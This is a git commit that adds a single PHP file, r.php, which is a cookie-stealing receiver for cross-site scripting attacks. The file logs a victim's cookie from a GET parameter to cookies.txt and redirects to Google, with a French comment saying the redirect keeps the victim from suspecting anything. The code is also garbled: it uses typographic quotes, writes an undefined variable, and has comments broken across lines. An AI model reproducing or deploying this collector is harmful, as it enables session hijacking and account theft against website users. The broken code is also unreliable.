4375709af6304659c75ec6c75805f0dd46855f8b
Florian Comte <comte.florian@gmail.com>
2023-04-01 16:57:38 +0200

    initial commit

---
+++ r.php
@@ -0,0 +1,16 @@
+<?php
+$cookie = $_GET[«c»]; // on reconnaît c en variable GET
+if($cookie)
+{
+ $fp = fopen(«cookies.txt»,»a»); // On ouvre cookies.txt en edition 
+(il est créé si il n’existe pas)
+ fputs($fp,$cook . «\r\n»); // On écrit le contenu du cookie sur une 
+nouvelle ligne
+ fclose($fp); // On ferme le fichier cookies.txt
+ /* FAIRE UNE REDIRECTION JAVASCRIPT CI-DESSOUS POUR QU’ON SE DOUTE 
+DE RIEN */
+}
+?>
+<script>
+location.replace(«http://www.google.fr»);
+</script>
